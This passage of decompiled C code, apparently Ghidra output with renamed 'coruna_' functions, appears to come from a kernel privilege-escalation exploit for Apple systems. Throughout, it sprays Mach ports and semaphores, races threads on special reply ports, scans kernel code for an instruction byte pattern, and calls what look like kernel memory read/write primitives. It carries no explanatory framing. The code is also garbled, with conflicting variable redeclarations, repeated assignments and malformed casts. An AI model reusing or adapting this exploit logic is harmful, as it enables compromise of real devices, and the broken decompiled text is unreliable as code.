              if (cache_41 + ((uint)cache_41 - 3) < 0x7d1) {
                size = 0;
                if ((uint)cache_41 - 3 != 0) {
                  version = 0;
                  do {
                    copy = (uint8_t *)coruna_pipe_open(cache_96);
                    if ((int)copy != 0) goto exit_ok;
                    copy = (uint8_t *)
                              coruna_mach_port_deallocate_11510(cache_96,
                                           lv11 + (unsigned long)(version + cache_41) * 4,
                                           lv50 + (unsigned long)(version + cache_41) * 4);
                    if ((int)copy != 0) goto exit_ok;
                    version = version + 1;
                    size = (uint)cache_41 - 3;
                  } while (version < size);
                  copy = (vm_map_t *)k_kernel_mach_task_self_slot;
                }
                cache_41 = coruna_u64_pack((size + cache_41), ((uint))cache_41);
                cache_54 = 0;
                cache_53 = 0;
                target_task = *copy;
                cache_52 = 0;
                cache_48 = 0;
                cache_47 = 0;
                cache_46 = 0;
                size = *(uint *)(off + 0x180);
                type_id_13 = (unsigned long)size;
                cache_45 = 0;
                cache_44 = 0;
                cache_118 = 0;
                cache_160 = 0;
                cache_117 = 0;
                cache_159 = 0;
                cache_116 = 0;
                cache_158 = 0;
                cache_115 = 0;
                cache_157 = 0;
                cache_114 = 0;
                cache_156 = 0;
                cache_113 = 0;
                cache_155 = 0;
                cache_112 = 0;
                cache_154 = 0;
                cache_111 = 0;
                cache_153 = 0;
                cache_110 = 0;
                cache_152 = 0;
                cache_109 = 0;
                cache_151 = 0;
                cache_108 = 0;
                cache_150 = 0;
                cache_107 = 0;
                cache_149 = 0;
                cache_106 = 0;
                cache_148 = 0;
                cache_105 = 0;
                cache_147 = 0;
                cache_104 = 0;
                cache_146 = 0;
                cache_103 = 0;
                cache_145 = 0;
                cache_102 = 0;
                cache_144 = 0;
                cache_101 = 0;
                cache_143 = 0;
                cache_100 = 0;
                cache_142 = 0;
                cache_99 = 0;
                cache_141 = 0;
                cache_98 = 0;
                cache_140 = 0;
                cache_97 = 0;
                cache_139 = 0;
                cache_96 = 0;
                cache_138 = 0;
                cache_95 = 0;
                cache_137 = 0;
                cache_94 = 0;
                cache_136 = 0;
                cache_93 = 0;
                cache_135 = 0;
                cache_92 = 0;
                cache_134 = 0;
                cache_91 = 0;
                cache_133 = 0;
                cache_90 = 0;
                cache_132 = 0;
                cache_89 = 0;
                cache_131 = 0;
                cache_88 = 0;
                cache_130 = 0;
                cache_87 = 0;
                cache_129 = (void *)0x0;
                cache_86 = 0;
                cache_128 = 0;
                cache_85 = 0;
                cache_127 = 0;
                cache_84 = 0;
                cache_126 = 0;
                cache_83 = 0;
                cache_125 = 0;
                cache_82 = 0;
                cache_124 = 0;
                cache_81 = 0;
                cache_123 = 0;
                cache_80 = 0;
                cache_122 = 0;
                cache_79 = 0;
                cache_121 = 0;
                cache_78 = 0;
                cache_120 = 0;
                cache_77 = 0;
                cache_119 = 0;
                cache_76 = 0;
                cache_118 = 0;
                cache_75 = 0;
                cache_117 = 0;
                cache_74 = 0;
                cache_116 = 0;
                cache_73 = 0;
                cache_115 = 0;
                cache_72 = 0;
                cache_114 = 0;
                cache_71 = 0;
                cache_113 = 0;
                cache_70 = 0;
                cache_112 = 0;
                cache_69 = 0;
                cache_111 = 0;
                cache_68 = 0;
                cache_110 = 0;
                cache_67 = 0;
                cache_109 = 0;
                cache_66 = 0;
                cache_108 = 0;
                cache_65 = 0;
                cache_107 = 0;
                cache_64 = 0;
                cache_106 = 0;
                cache_63 = 0;
                cache_105 = 0;
                cache_62 = 0;
                cache_104 = 0;
                cache_61 = 0;
                cache_103 = 0;
                cache_60 = 0;
                cache_102 = 0;
                cache_59 = 0;
                cache_101 = 0;
                cache_58 = 0;
                cache_100 = 0;
                cache_57 = 0;
                cache_99 = 0;
                cache_56 = 0;
                cache_98 = 0;
                cache_55 = 0;
                cache_97 = 0;
                cache_43 = 0;
                cache_42 = (int *)0x0;
                err = coruna_host_priv_statistics_11020();
                buf = cache_61 + type_id_11 * 0x1e4;
                copy = (uint8_t *)coruna_pipe_open(buf);
                if ((int)copy == 0) {
                  version = _vm_allocate(target_task,&cache_46,type_id_13,1);
                  if (version == 0) {
                    (&cache_62)[type_id_11 * 0xf2] = cache_46;
                    lps33 = cache_63 + type_id_11 * 0xf2;
                    *lps33 = type_id_13;
                    status = _mlock(cache_46,type_id_13);
                    lv11 = cache_46;
                    if (status == 0) {
                      serial = 0;
                      lpm5 = cache_78 + type_id_11 * 0x1e4;
                      data = cache_82 + type_id_11 * 0x1e4 + 3;
                      do {
                        version = _semaphore_create(target_task,
                                                   (semaphore_t *)((long)lps45 + serial),0,0);
                        if (version != 0) {
                          copy = (uint8_t *)(unsigned long)(version | 0x80000000);
                          goto exit_ok;
                        }
                        serial = serial + 4;
                      } while (serial != 0x40);
                      cache_59 = 0;
                      version = _semaphore_create(*(task_t *)k_kernel_mach_task_self_slot,
                                                 &cache_59,0,0);
                      if (version == 0) {
                        ctx_val = 0x10;
                        serial_9 = serial_8;
                        serial = serial_7;
                        do {
                          cache_57 = *(uint32_t *)((long)cache_66 + serial_9);
                          cache_55 = cache_64 + serial_9;
                          cache_56 = cache_65 + serial_9;
                          cache_58 = cache_59;
                          status = _pthread_attr_init(cache_163);
                          if (status != 0) {
                            err = ___error();
                            status = *err;
                            obj = (uint *)___error();
                            version = -*obj;
                            if (-1 < status) {
                              version = *obj;
                            }
                            copy = (uint8_t *)(unsigned long)(version | 0x40000000);
                            goto code_r0x0000a470;
                          }
                          status = _pthread_attr_setdetachstate(cache_163,1);
                          if (status != 0) {
                            _pthread_attr_destroy(cache_163);
                            err = ___error();
                            status = *err;
                            obj = (uint *)___error();
                            version = -*obj;
                            if (-1 < status) {
                              version = *obj;
                            }
                            copy = (uint8_t *)(unsigned long)(version | 0x40000000);
                            goto code_r0x0000a470;
                          }
                          lppv26 = (void **)coruna_fn_ptr_cast(coruna_thread_get_special_reply_port);
                          status = _pthread_create((pthread_t *)((long)cache_60 + serial),
                                                   cache_163,lppv26,&cache_55);
                          _pthread_attr_destroy(cache_163);
                          if (status != 0) {
                            err = ___error();
                            status = *err;
                            obj = (uint *)___error();
                            version = -*obj;
                            if (-1 < status) {
                              version = *obj;
                            }
                            copy = (uint8_t *)(unsigned long)(version | 0x40000000);
                            goto code_r0x0000a470;
                          }
                          version = _semaphore_timedwait(cache_59,(mach_timespec_t)0x1);
                          if (version != 0) {
                            copy = (uint8_t *)(unsigned long)(version | 0x80000000);
                            goto code_r0x0000a470;
                          }
                          serial = serial + 8;
                          serial_9 = serial_9 + 4;
                          ctx_val = ctx_val + -1;
                        } while (ctx_val != 0);
                        copy = (uint8_t *)0x0;
code_r0x0000a470:
                        version = _semaphore_destroy(*(task_t *)k_kernel_mach_task_self_slot,
                                                    cache_59);
                        if (version == 0 || (int)copy != 0) {
                          if ((int)copy == 0) {
                            if (*ptr == '\0') {
                              lm18 = _mach_reply_port();
                              copy = (uint8_t *)0x28008;
                              if (1 < lm18 + 1) {
                                bootargs = 0;
                                cache_67[type_id_11 * 0x1e4] = lm18;
code_r0x0000a58c:
                                type_id = *(unsigned long *)k_kernel_vm_page_size_slot;
                                type_id_12 = 0;
                                if (type_id != 0) {
                                  type_id_12 = 0x8000 / type_id;
                                }
                                serial = 0x8000 - type_id_12 * type_id;
                                size = 0x8000;
                                if (serial != 0) {
                                  size = (type_id - serial) + 0x8000;
                                }
                                version = _vm_allocate(target_task,&cache_45,size,1);
                                continue;
                              }
                            }
                            else {
                              bootargs = coruna_return_zero_2b2d0(off);
                              if (bootargs == 0) {
                                copy = (uint8_t *)0x2802b;
                              }
                              else {
                                cache_82[type_id_11 * 0x1e4 + 2] = bootargs;
                                lm18 = _mach_reply_port();
                                copy = (uint8_t *)0x28008;
                                if (1 < lm18 + 1) {
                                  cache_67[type_id_11 * 0x1e4] = lm18;
                                  copy = (uint8_t *)coruna_pipe_open(cache_87 + type_id_11 * 0x790)
                                  ;
                                  if ((int)copy == 0) {
                                    version = _vm_allocate(target_task,(vm_address_t *)&cache_42,
                                                          type_id_13,1);
                                    if (version == 0) {
                                      cache_88[type_id_11 * 0xf2] = (unsigned long)cache_42;
                                      cache_88[type_id_11 * 0xf2 + 1] = type_id_13;
                                      status = _mlock(cache_42,type_id_13);
                                      goto code_r0x0000a58c;
                                    }
                                    continue;
                                  }
                                }
                              }
                            }
                          }
                          goto exit_ok;
                        }
                      }
next:
                      copy = (uint8_t *)(unsigned long)(version | 0x80000000);
                    }
                    else {
                      err = ___error();
                      err = *err;
                      data = (uint *)___error();
                      size = -*data;
                      if (-1 < err) {
                        size = *data;
                      }
                      copy = (uint8_t *)(unsigned long)(size | 0x40000000);
                    }
                  }
                  else {
                    copy = (uint8_t *)(unsigned long)(version | 0x80000000);
                  }
                }
              }
              else {
                copy = &k_kernel_rodata_word_2e012;
              }
            }
            else {
              copy = (uint8_t *)0xad00c;
            }
          }
        }
        goto exit_ok;
      }
      goto fail;
    }
  }
exit_ok:
  if (*(long *)k_kernel_stack_chk_guard_slot == cache_164) {
    return copy;
  }
  ___stack_chk_fail();
}





unsigned long coruna_mach_port_destroy_bfe4(unsigned long arg,vm_address_t *val)

{
  vm_map_t target_task;
  semaphore_t semaphore;
  mach_port_name_t lm1;
  int err;
  bool err;
  uint size;
  vm_address_t lv5;
  vm_size_t lv6;
  bool status;
  unsigned long version;
  long handle;
  int *err;
  natural_t host_info;
  mach_vm_address_t serial_buf;
  
  version = arg;
  if (*(char *)((long)val + 0x1c9) == '\0') {
    target_task = *(vm_map_t *)k_kernel_mach_task_self_slot;
    if ((*val != 0) && (val[1] != 0)) {
      _vm_deallocate(target_task,*val,val[1]);
      *val = 0;
      val[1] = 0;
    }
    lv5 = val[5];
    if ((lv5 != 0) && (val[6] != 0)) {
      _vm_deallocate(target_task,lv5,val[6]);
      val[5] = 0;
      val[6] = 0;
    }
    if ((val[0xe8] != 0) && (val[0xe9] != 0)) {
      _vm_deallocate(target_task,val[0xe8],val[0xe9]);
      val[0xe8] = 0;
      val[0xe9] = 0;
    }
    handle = 0;
    err = true;
    do {
      status = err;
      err = (int *)((long)val + handle * 4 + 0x18);
      err = *err;
      if (1 < err + 1U) {
        _close(err);
      }
      *err = 0;
      err = (int *)((long)val + handle * 4 + 0x20);
      err = *err;
      if (1 < err + 1U) {
        _close(err);
      }
      *err = 0;
      err = *(int *)((long)val + handle * 4 + 0x734);
      if (1 < err + 1U) {
        _close(err);
      }
      *(uint32_t *)((long)val + handle * 4 + 0x734) = 0;
      handle = 1;
      err = false;
    } while (status);
    if (*(int *)((long)val + 0x604) != 0) {
      version = 0;
      do {
        err = *(int *)((long)val + version * 4 + 0x204);
        if (1 < err + 1U) {
          _close(err);
        }
        *(uint32_t *)((long)val + version * 4 + 0x204) = 0;
        version = version + 1;
      } while (version < *(uint *)((long)val + 0x604));
    }
    version = coruna_pthread_mach_thread_np_cd90(arg,val);
    handle = 0;
    do {
      semaphore = *(semaphore_t *)((long)val + handle + 0x138);
      if (1 < semaphore + 1) {
        size = _semaphore_destroy(target_task,semaphore);
        version = (unsigned long)size;
      }
      *(uint32_t *)((long)val + handle + 0x138) = 0;
      lm1 = *(mach_port_name_t *)((long)val + handle + 0xf8);
      if (1 < lm1 + 1) {
        size = _mach_port_destroy(target_task,lm1);
        version = (unsigned long)size;
      }
      *(uint32_t *)((long)val + handle + 0xf8) = 0;
      lm1 = *(mach_port_name_t *)((long)val + handle + 0xb8);
      if (1 < lm1 + 1) {
        size = _mach_port_destroy(target_task,lm1);
        version = (unsigned long)size;
      }
      *(uint32_t *)((long)val + handle + 0xb8) = 0;
      handle = handle + 4;
    } while (handle != 0x40);
    if (1 < (mach_port_name_t)val[0x2f] + 1) {
      size = _mach_port_destroy(target_task,(mach_port_name_t)val[0x2f]);
      version = (unsigned long)size;
      *(uint32_t *)(val + 0x2f) = 0;
    }
    if (1 < (int)val[0x3a] + 1U) {
      serial_buf = 0;
      host_info = 0;
      if (((*(int *)(arg + 0x140) == 0x1809) && (1 < *(int *)(&k_kernel_slot_1918 + arg) + 1U)) &&
         (handle = coruna_call_return_zero_2c0bc(arg), version = 0, handle != 0)) {
        version = coruna_call_mach_vm_machine_attribute_29df8_18d98(arg,handle + 0x10,4,&host_info);
        if (((int)version != 0) && (host_info != 0)) {
          host_info = 0;
          version = coruna_call_mach_vm_machine_attribute_29df8_1aa94(arg,handle + 0x10,&host_info,4);
          if (((int)version != 0) &&
             (version = coruna_kernel29bb0_trampoline_0001a670(arg,handle,&serial_buf), (int)version != 0)) {
            version = coruna_call_mach_vm_machine_attribute_29df8_1aa8c(arg,serial_buf + 0x80,0);
          }
        }
      }
      *(uint32_t *)(val + 0x3a) = 0;
    }
    handle = 0;
    do {
      lm1 = *(mach_port_name_t *)((long)val + handle + 0x1d4);
      if (1 < lm1 + 1) {
        size = _mach_port_destroy(target_task,lm1);
        version = (unsigned long)size;
      }
      *(uint32_t *)((long)val + handle + 0x1d4) = 0;
      handle = handle + 4;
    } while (handle != 0x14);
    if (1 < (mach_port_name_t)val[0x3d] + 1) {
      size = _mach_port_kobject(target_task,(mach_port_name_t)val[0x3d],&host_info,&serial_buf);
      version = (unsigned long)size;
      if ((size == 0) && (host_info != 2)) {
        size = _mach_port_destroy(target_task,(mach_port_name_t)val[0x3d]);
        version = (unsigned long)size;
      }
      *(uint32_t *)(val + 0x3d) = 0;
    }
    lv5 = val[0x3e];
    if (lv5 != 0) {
      if ((int)val[0x40] == 0) {
        lv6 = 0;
      }
      else {
        version = 0;
        do {
          lm1 = *(mach_port_name_t *)(lv5 + version * 4);
          if (1 < lm1 + 1) {
            _mach_port_destroy(target_task,lm1);
          }
          *(uint32_t *)(lv5 + version * 4) = 0;
          version = version + 1;
        } while (version < (uint)val[0x40]);
        lv5 = val[0x3e];
        lv6 = (unsigned long)(uint)val[0x40] << 2;
      }
      size = _vm_deallocate(target_task,lv5,lv6);
      version = (unsigned long)size;
      val[0x3e] = 0;
    }
    lv5 = val[0x3f];
    if (lv5 != 0) {
      if ((int)val[0x40] == 0) {
        lv6 = 0;
      }
      else {
        version = 0;
        do {
          lm1 = *(mach_port_name_t *)(lv5 + version * 4);
          if (1 < lm1 + 1) {
            _mach_port_destroy(target_task,lm1);
          }
          *(uint32_t *)(lv5 + version * 4) = 0;
          version = version + 1;
        } while (version < (uint)val[0x40]);
        lv5 = val[0x3f];
        lv6 = (unsigned long)(uint)val[0x40] << 2;
      }
      size = _vm_deallocate(target_task,lv5,lv6);
      version = (unsigned long)size;
      val[0x3f] = 0;
    }
    lv5 = val[0x30];
    if (lv5 != 0) {
      handle = 0;
      do {
        if (1 < *(mach_port_name_t *)(lv5 + handle) + 1) {
          size = _mach_port_destroy(target_task,*(mach_port_name_t *)(lv5 + handle));
          version = (unsigned long)size;
          lv5 = val[0x30];
        }
        *(uint32_t *)(lv5 + handle) = 0;
        handle = handle + 4;
      } while (handle != 0x8000);
      val[0x30] = 0;
    }
    if ((val[0x31] != 0) && (val[0x32] != 0)) {
      size = _vm_deallocate(target_task,val[0x31],val[0x32]);
      version = (unsigned long)size;
      val[0x31] = 0;
      val[0x32] = 0;
    }
    if ((val[0xeb] != 0) && ((uint)val[0xec] != 0)) {
      size = _vm_deallocate(target_task,val[0xeb],(unsigned long)(uint)val[0xec] << 2);
      version = (unsigned long)size;
      val[0xeb] = 0;
      *(uint32_t *)(val + 0xec) = 0;
    }
    if ((val[0xee] != 0) && (val[0xef] != 0)) {
      size = _vm_deallocate(target_task,val[0xee],val[0xef]);
      version = (unsigned long)size;
      val[0xee] = 0;
      val[0xef] = 0;
    }
    if (1 < (mach_port_name_t)val[0xf1] + 1) {
      size = _mach_port_destroy(target_task,(mach_port_name_t)val[0xf1]);
      version = (unsigned long)size;
      *(uint32_t *)(val + 0xf1) = 0;
    }
    if (1 < *(mach_port_name_t *)((long)val + 0x78c) + 1) {
      size = _mach_port_destroy(target_task,*(mach_port_name_t *)((long)val + 0x78c));
      version = (unsigned long)size;
      *(uint32_t *)((long)val + 0x78c) = 0;
    }
    if (val[0x33] != 0) {
      version = coruna_mach_port_mod_refs(arg);
      val[0x33] = 0;
    }
    if (val[0xed] != 0) {
      version = coruna_mach_port_mod_refs(arg);
      val[0xed] = 0;
    }
  }
  return version;
}





uint8_t * coruna_kernel29bb0_via_ctx_set_flag(long handle,long addr_2,uint32_t size,long *off_3)
{
  int err;
  uint8_t *ptr;
  uint32_t scratch;
  long bootargs;
  uint32_t thread_attr;
  
  bootargs = 0;
  if (*(long *)(handle + 0x1c8) == 0) {
    ptr = (uint8_t *)0x28024;
  }
  else {
    thread_attr = size;
    do {
      coruna_ctx_set_flag(handle,0x80);
      ptr = (uint8_t *)(**(void (**)(handle + 0x1c8))(handle,1,&thread_attr,4,&bootargs,8);
      coruna_ctx_clear_flag(handle,0x80);
      if ((int)ptr != 0) {
        return ptr;
      }
      if (bootargs != 0) {
        *off_3 = bootargs;
        return (uint8_t *)0x0;
      }
      if (*(char *)(addr_2 + 0x1ca) != '\0') {
        return &k_kernel_rodata_word_2e009;
      }
      scratch = 0;
      err = (**(void (**)(handle + 0x1c8))(handle,4,&scratch,4,0,0);
      if (err != 0) {
        return &k_kernel_rodata_word_2e00f;
      }
      *(uint8_t *)(addr_2 + 0x1ca) = 1;
    } while (bootargs == 0);
    ptr = (uint8_t *)0x0;
  }
  return ptr;
}





void coruna_kernel29bb0_str_1f_04_00_71_08_05_08_0b(long handle,long addr_2)
{
  bool err;
  uint u;
  unsigned long size;
  int err;
  uint version;
  long handle;
  unsigned long port;
  long addr;
  uint tag;
  unsigned long kind;
  long off;
  int status;
  uint scratch;
  long bootargs;
  uint64_t thread_attr;
  uint8_t host_info[40];
  long serial_buf;
  long action;
  long block_ctx;
  long stack_guard;
  
  stack_guard = *(long *)k_kernel_stack_chk_guard_slot;
  if (*(unsigned long *)(handle + 0x158) < 0x18090a09600000) {
    coruna_macho_text_sect(host_info,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
    handle = coruna_strsep(host_info,"1F 04 00 71 .. .. .. .. .. .. .. .. 08 05 08 0B",0,1);
    if ((handle != 0) &&
       (handle = coruna_return_zero_1555c_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -4), handle != 0)) {
      port = handle + 4;
      kind = (unsigned long)*(int *)(handle + 0x168);
      size = 0;
      if (kind != 0) {
        size = port / kind;
      }
      off = port - size * kind;
      handle = 0;
      if (off != 0) {
        handle = kind - off;
      }
      if (*(int *)(handle + 0x140) < 0x1809) {
        kind = 0;
      }
      handle = coruna_kernel29bb0_trampoline_00010cac(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + port + kind);
      if (handle != 0) {
        scratch = 0;
        off = 0xf;
        {
          int str_fail = 0;
          int str_cleanup = 0;
          do {
            port = coruna_ret_stub_2(handle,*(uint32_t *)(addr_2 + off * 4 + 0xb8));
            if (port == 0) {
              version = 0x800e;
              str_fail = 1;
              break;
            }
          status = 0;
          version = (-((uint)port >> 7 & 1) & 0xfffc0000 | ((uint)port & 0xff) << 10) +
                  (int)(char)port;
          u = (int)(port >> 4) * 0x5052acdb;
          do {
            tag = u >> 0x18 ^ u;
            if (*(unsigned long *)(handle + 0x158) < 0x13274105500000) {
              addr = 1;
              tag = version ^ version >> 6;
              do {
                tag = (tag + (int)(char)host_info[addr + -8]) * 0x401;
                tag = tag ^ tag >> 6;
                addr = addr + 1;
              } while (addr != 8);
              tag = tag * 9 ^ tag * 9 >> 0xb;
            }
            thread_attr = port;
            err = coruna_kernel29bb0_trampoline_0001a670(handle,handle + 0x10 + (unsigned long)((tag & 0x1f) * 0x18),
                                       &bootargs);
            if (err != 0) {
              do {
                bootargs = coruna_ptr_canonicalize(handle,bootargs);
                if ((bootargs == 0) ||
                   (err = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,bootargs,0x68,host_info), err == 0)) break;
                if (block_ctx == 0) {
                  kind = 0;
                }
                else {
                  kind = coruna_ptr_canonicalize(handle);
                  if (kind == 0) break;
                }
                if (kind == port) {
                  if (serial_buf == 0) {
                    break;
                  }
                  addr = coruna_ptr_canonicalize(handle);
                  if ((addr != 0) && (err = coruna_call_mach_vm_machine_attribute_29df8_1aa8c(handle,bootargs + 0x28,0), err != 0)
                     ) {
                    scratch = scratch + 1;
                    if (scratch < *(uint *)(addr_2 + 0x730)) {
                      break;
                    }
                    str_cleanup = 1;
                    break;
                  }
                  break;
                }
                bootargs = action;
              } while (action != 0);
            }
            status = status + 1;
          } while (status != 4);
          err = off != 0;
          off = off + -1;
        } while (err && !str_fail && !str_cleanup);
          if (str_fail) {
            version = 0xe008;
            port = (unsigned long)(version | 0x20000);
          }
          else if (str_cleanup) {
            port = coruna_pthread_mach_thread_np_cd90(handle,addr_2);
          }
        }
      }
    }
  }
  else {
    port = coruna_pthread_mach_thread_np_cd90(handle,addr_2);
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
    ___stack_chk_fail(port);
  }
  return;
}





unsigned long coruna_kernel29bb0_via_call_mach_msg_27d70_29680(uint64_t arg,long *val,uint64_t n,uint64_t m)

{
  uint port;
  uint tag;
  unsigned long u;
  long addr;
  
  addr = *val;
  if (addr == 0) {
    u = coruna_call_mach_port_set_attributes_28f78(arg,n,0x1000,val);
    if ((int)u != 0) {
      return u;
    }
    u = coruna_call_mach_msg_27d70_29680(arg,*val);
    if ((int)u != 0) {
      return u;
    }
    addr = *val;
  }
  tag = coruna_helper_17c24_294e4(arg,addr,0);
  if (tag == 0) {
    if (((int)m == 0) || (u = coruna_call_mach_vm_machine_attribute_29df8_29184(arg,*val,m), (int)u == 0)) {
      u = 0;
    }
  }
  else {
    port = 0x28028;
    if (tag != 0x28029) {
      port = tag;
    }
    u = (unsigned long)port;
  }
  return u;
}





uint coruna_host_request_notification(mach_port_t *port,uint size)
{
  mach_port_t host;
  uint u;
  unsigned long size;
  
  host = _mach_host_self();
  if (size != 0) {
    size = (unsigned long)size;
    do {
      u = _host_request_notification(host,0,*port);
      if (u != 0) {
        return u | 0x80000000;
      }
      port = port + 1;
      size = size - 1;
    } while (size != 0);
  }
  return 0;
}





uint8_t * coruna_kernel29bb0_via_ctx_set_flag_2(long handle,long addr_2,uint32_t size,long *off_3)
{
  int err;
  uint8_t *ptr;
  uint32_t scratch;
  long bootargs;
  uint32_t thread_attr;
  
  bootargs = 0;
  if (*(long *)(handle + 0x1c8) == 0) {
    ptr = (uint8_t *)0x28024;
  }
  else {
    thread_attr = size;
    do {
      coruna_ctx_set_flag(handle,0x80);
      ptr = (uint8_t *)(**(void (**)(handle + 0x1c8))(handle,2,&thread_attr,4,&bootargs,8);
      coruna_ctx_clear_flag(handle,0x80);
      if ((int)ptr != 0) {
        return ptr;
      }
      if (bootargs != 0) {
        *off_3 = bootargs;
        return (uint8_t *)0x0;
      }
      if (*(char *)(addr_2 + 0x1ca) != '\0') {
        return &k_kernel_rodata_word_2e009;
      }
      scratch = 0;
      err = (**(void (**)(handle + 0x1c8))(handle,4,&scratch,4,0,0);
      if (err != 0) {
        return &k_kernel_rodata_word_2e00f;
      }
      *(uint8_t *)(addr_2 + 0x1ca) = 1;
    } while (bootargs == 0);
    ptr = (uint8_t *)0x0;
  }
  return ptr;
}
void coruna_mach_msg_ca9c(uint64_t val,uint64_t id_2,int flags,uint64_t size_3,
                 uint32_t size)
{
  mach_msg_return_t lm1;
  uint8_t u[12];
  uint8_t scratch[28];
  uint64_t bootargs;
  uint32_t thread_attr;
  uint64_t host_info;
  uint16_t serial_buf;
  uint8_t action;
  uint32_t block_ctx;
  long stack_guard;
  
  u = (*(void (*)k_kernel_chkstk_darwin_slot)();
  stack_guard = *(long *)k_kernel_stack_chk_guard_slot;
  _bzero(&host_info,0x2000);
  scratch = 0x828;
  if (*(int *)(u + 0x180) != 0x1000) {
    scratch = 0x2028;
  }
  scratch = 0x80000014;
  scratch = k_kernel_rodata_word_0002ae08;
  scratch = k_kernel_rodata_word_2ae00;
  scratch = k_kernel_rodata_word_0002ae04;
  bootargs = 0;
  thread_attr = 0;
  scratch = u;
  if (flags == 2) {
    serial_buf = 0x1100;
    action = 2;
  }
  else {
    if (flags != 0) {
      lm1 = 4;
      if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
      return;
      }
      ___stack_chk_fail(lm1);
    }
    size = 0;
    serial_buf = coruna_cat(0x11,(uint8_t)serial_buf);
  }
  host_info = size_3;
  block_ctx = size;
  lm1 = _mach_msg((mach_msg_header_t *)scratch,0x40001,scratch,0,0,0,0);
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
    return;
  }
  ___stack_chk_fail(lm1);
}





uint coruna_mach_port_set_attributes_cbd0(mach_port_name_t *arg,uint size)
{
  ipc_space_t task;
  uint u;
  unsigned long size;
  integer_t scratch [2];
  
  if (size != 0) {
    task = *(ipc_space_t *)k_kernel_mach_task_self_slot;
    size = (unsigned long)size;
    do {
      scratch[0] = 0;
      u = _mach_port_set_attributes(task,*arg,1,scratch,1);
      if (u != 0) {
        return u | 0x80000000;
      }
      arg = arg + 1;
      size = size - 1;
    } while (size != 0);
  }
  return 0;
}





uint64_t coruna_thread_get_special_reply_port(uint64_t *val)
{
  mach_port_name_t rcv_name;
  mach_port_t lm1;
  mach_msg_return_t lm2;
  kern_return_t lk3;
  mach_msg_header_t scratch;
  mach_msg_header_t bootargs;
  uint64_t scratch;
  
  bootargs.msgh_remote_port = 0;
  bootargs.msgh_local_port = 0;
  bootargs.msgh_bits = 0;
  bootargs.msgh_size = 0;
  scratch = 0;
  bootargs.msgh_reserved = 0;
  bootargs.msgh_id = 0;
  scratch.msgh_local_port = 0;
  scratch.msgh_reserved = 0;
  scratch.msgh_size = 0;
  scratch.msgh_remote_port = 0;
  scratch.msgh_id = 0;
  if (k_kernel_thread_get_special_reply_port_slot != (uint8_t *)0x0) {
    rcv_name = _thread_get_special_reply_port();
    if (1 < rcv_name + 1) {
      *(mach_port_name_t *)*val = rcv_name;
      lm1 = _mach_reply_port();
      if (1 < lm1 + 1) {
        *(mach_port_t *)val[1] = lm1;
        scratch.msgh_bits = 0x1514;
        scratch.msgh_remote_port = lm1;
        scratch.msgh_local_port = rcv_name;
        lm2 = _mach_msg(&scratch,0x100001,0x18,0,0,0,0);
        if ((lm2 == 0) &&
           (lk3 = _semaphore_wait_signal
                              (*(semaphore_t *)(val + 2),*(semaphore_t *)((long)val + 0x14))
           , lk3 == 0)) {
          _mach_msg(&bootargs,0x402,0,0x20,rcv_name,0,0);
        }
      }
    }
  }
  return 0;
}





uint8_t * coruna_bzero_cd2c(long handle)
{
  uint8_t *ptr;
  void *ptr;
  
  ptr = *(void **)(handle + 0x1e8);
  if (ptr == (void *)0x0) {
    ptr = &k_kernel_rodata_word_2e007;
  }
  else {
    ptr = (uint8_t *)coruna_kernel29bb0_str_1f_04_00_71_08_05_08_0b(handle,ptr);
    if ((int)ptr == 0) {
      coruna_mach_port_destroy_bfe4(handle,ptr);
      _bzero(ptr,0x790);
      _free(ptr);
      ptr = (uint8_t *)0x0;
    }
  }
  return ptr;
}





uint coruna_pthread_mach_thread_np_cd90(long handle,long addr_2)
{
  uint u;
  long handle;
  bool err;
  mach_port_t target_act;
  int err;
  uint size;
  uint version;
  long addr;
  long off;
  int *err;
  uint *ptr;
  long base;
  uint scratch;
  long bootargs;
  long thread_attr;
  int host_info;
  long serial_buf;
  thread_act_t action;
  
  base = 0;
  addr_2 = addr_2 + 0x38;
  scratch = 0x2800e;
  do {
    if (*(pthread_t *)(addr_2 + base) != (pthread_t)0x0) {
      target_act = _pthread_mach_thread_np(*(pthread_t *)(addr_2 + base));
      if (target_act + 1 < 2) {
        return 0x28008;
      }
      err = _pthread_detach(*(pthread_t *)(addr_2 + base));
      if (err != 0) {
        err = ___error();
        err = *err;
        ptr = (uint *)___error();
        size = -*ptr;
        if (-1 < err) {
          size = *ptr;
        }
        return size | 0x40000000;
      }
      *(uint64_t *)(addr_2 + base) = 0;
      size = _thread_suspend(target_act);
      return size | 0x80000000;
    }
    base = base + 8;
    if (base == 0x80) {
      return 0;
    }
  } while( true );
}





void coruna_kernel29bb0_via_mach_port_allocate(long handle)
{
  void (*ptr)(void);
  uint64_t *ptr;
  unsigned long unaff_x30;
  
  ptr = *(uint64_t **)(&k_kernel_slot_18c8 + handle);
  if (ptr == (uint64_t *)0x0) {
    return;
  }
  if ((ptr[0x16] != 0) && (*(int *)(ptr + 0x17) != 0)) {
    coruna_mach_port_allocate(handle);
    ptr[0x16] = 0;
    *(uint32_t *)(ptr + 0x17) = 0;
  }
  if (ptr[0x1c] != 0) {
    coruna_mach_port_allocate(handle,ptr[0x1c],8);
    ptr[0x1c] = 0;
  }
  if (ptr[0x1a] != 0) {
    coruna_mach_port_allocate(handle,ptr[0x1a],8);
    ptr[0x1a] = 0;
  }
  if (ptr[0x1d] != 0) {
    coruna_mach_port_allocate(handle,ptr[0x1d],0x1000);
    ptr[0x1d] = 0;
  }
  if (ptr[0xb] != 0) {
    coruna_mach_port_allocate(handle,ptr[0xb],0x3000);
    ptr[0xb] = 0;
  }
  if (ptr[0x10] != 0) {
    coruna_mach_port_allocate(handle,ptr[0x10],0x308);
    ptr[0x10] = 0;
  }
  if (ptr[0xf] != 0) {
    coruna_mach_port_allocate(handle,ptr[0xf],0x4000);
    ptr[0xf] = 0;
  }
  coruna_vm_deallocate(ptr);
  *(uint64_t *)(&k_kernel_slot_18c8 + handle) = 0;
  ptr[0x23] = 0;
  ptr[0x22] = 0;
  ptr[0x25] = 0;
  ptr[0x24] = 0;
  ptr[0x1f] = 0;
  ptr[0x1e] = 0;
  ptr[0x21] = 0;
  ptr[0x20] = 0;
  ptr[0x1b] = 0;
  ptr[0x1a] = 0;
  ptr[0x1d] = 0;
